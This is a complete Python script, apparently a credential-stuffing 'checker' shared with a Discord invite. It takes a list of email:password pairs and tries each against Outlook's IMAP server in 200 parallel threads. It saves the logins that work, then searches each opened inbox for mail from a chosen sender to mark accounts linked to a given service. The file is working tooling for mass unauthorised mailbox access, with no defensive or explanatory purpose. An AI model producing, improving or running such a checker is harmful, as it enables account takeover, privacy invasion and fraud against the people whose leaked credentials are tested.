import imaplib
import email
import os
import time
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init
import shutil

# Initialize colorama
init(autoreset=True)

# Configuration
input_file = "accounts.txt"
max_retries = 0
timeout_duration = 5  # Adjust as needed

# Variables for GUI display
valid_count = 0
found_count = 0
locked_count = 0
total_accounts = 0
found_accounts = []  # Stores details of found accounts

# Create results directory with timestamp
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
results_dir = f"results/{timestamp}"
os.makedirs(results_dir, exist_ok=True)

valid_file = os.path.join(results_dir, "valids.txt")

# Logo in green
logo = Fore.GREEN + '''
 █    ██   ██░ ██   ███▄ ▄███▓ ▄████▄ 
 ██  ▓██▒▒▓██░ ██  ▓██▒▀█▀ ██▒▒██▀ ▀█ 
▓██  ▒██░░▒██▀▀██  ▓██    ▓██░▒▓█    ▄
▓▓█  ░██░ ░▓█ ░██  ▒██    ▒██ ▒▓▓▄ ▄██
▒▒█████▓  ░▓█▒░██▓▒▒██▒   ░██▒▒ ▓███▀ 
 ▒▓▒ ▒ ▒   ▒ ░░▒░▒░░ ▒░   ░  ░░ ░▒ ▒  
 ░▒░ ░ ░   ▒ ░▒░ ░░░  ░      ░  ░  ▒  
  ░░ ░ ░   ░  ░░ ░ ░      ░   ░       
   ░       ░  ░  ░░       ░   ░ ░
'''

# Small footer text colored green
footer = Fore.GREEN + "Made by zunknownn | Join https://discord.gg/TrkhTSyrBf"

def center_text(text):
    terminal_width = shutil.get_terminal_size().columns
    lines = text.strip().split('\n')
    return '\n'.join(line.center(terminal_width) for line in lines)

def check_account(email_user, email_pass, sender, sender_file, retry=0):
    global valid_count, found_count, locked_count, found_accounts
    try:
        # Connect to the server
        mail = imaplib.IMAP4_SSL('outlook.office365.com', 993)
        
        # Login to the email account
        mail.login(email_user, email_pass)

        # Select the inbox
        mail.select("inbox")

        # Search for emails from the specified sender
        result, data = mail.search(None, f'(FROM "{sender}")')
        if result != 'OK':
            raise Exception(f"Failed to search for emails from {sender}")

        # Count emails
        mail_ids = data[0].split()
        number_of_emails = len(mail_ids)

        # Log valid account
        with open(valid_file, 'a') as f:
            f.write(f"{email_user}:{email_pass}\n")
        valid_count += 1

        # Log emails from the sender
        if number_of_emails > 0:
            sender_file_path = os.path.join(results_dir, f"{sender}.txt")
            with open(sender_file_path, 'a') as f:
                f.write(f"{email_user}:{email_pass} > {number_of_emails}\n")
            found_count += 1
            found_accounts.append(f"{email_user}:{email_pass} > {number_of_emails}")  # Append found account details
        else:
            locked_count += 1

    except Exception as e:
        locked_count += 1
    finally:
        try:
            # Attempt to close the connection properly
            mail.logout()
        except Exception as e:
            pass  # Ignoring errors during logout

def display_stats(total_accounts, checked_count):
    percent_checked = (checked_count / total_accounts) * 100 if total_accounts > 0 else 0
    checked_remaining = f"{checked_count}/{total_accounts - checked_count}"
    
    # Create the display text
    stats_text = (
        f"Valid: {valid_count}\n"
        f"Found: {found_count}\n"
        f"Invalid: {locked_count}\n"
        f"Percentage Checked: {percent_checked:.2f}%\n"
        f"Checked / Remaining: {checked_remaining}\n"
    )

    # Create the found accounts text in blue
    found_text = "\n".join(f"\033[94m> {acc}\033[0m" for acc in found_accounts)  # \033[94m is blue

    # Clear the console
    sys.stdout.write("\033[H\033[J")
    
    # Print the logo and footer
    print(center_text(logo))
    print(stats_text)  # Display stats without centering
    if found_text:
        print(found_text)  # Only display found accounts if there are any
    print(footer)  # Display the footer

def main():
    global total_accounts

    # Display ASCII Art initially (without showing stats yet)
    sys.stdout.write("\033[H\033[J")  # Clear screen before displaying logo
    print(center_text(logo))
    print(footer)

    # Center the input prompt as well
    sender = input(center_text("Enter the sender's email: ")).strip()

    # Read accounts from the input file
    with open(input_file, 'r') as f:
        accounts = [line.strip().split(':') for line in f]
    
    total_accounts = len(accounts)
    checked_count = 0

    # Use ThreadPoolExecutor for concurrent checking
    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = []
        for email_user, email_pass in accounts:
            futures.append(executor.submit(check_account, email_user, email_pass, sender, sender_file=f"{sender}.txt"))
        
        for future in as_completed(futures):
            checked_count += 1
            display_stats(total_accounts, checked_count)  # Update stats display

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProcess interrupted by user.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
